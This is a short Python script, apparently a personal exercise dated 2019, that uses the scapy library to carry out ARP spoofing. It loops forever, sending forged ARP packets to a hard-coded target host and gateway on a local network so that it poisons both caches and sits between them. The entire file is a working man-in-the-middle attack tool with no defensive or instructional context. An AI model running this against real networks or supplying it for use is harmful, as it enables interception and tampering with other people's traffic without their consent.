# !/usr/bin/env python3
# -*- coding:utf-8 -*-
'''
created by Fangyang on Time:2019/8/14
'''
from scapy.layers.l2 import Ether, ARP

__author__ = 'Fangyang'


from scapy.all import *

def arpspoof(target_ip, gatewayip):
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=target_ip, psrc=gatewayip)
    sendp(pkt)
    return


if __name__ == '__main__':
    target_ip = '192.168.1.107'
    gateway_ip = '192.168.1.1'
    while True:
        arpspoof(target_ip, gateway_ip)
        arpspoof(gateway_ip, target_ip)
        time.sleep(0.5)
    # chmod a+x c2_1.py



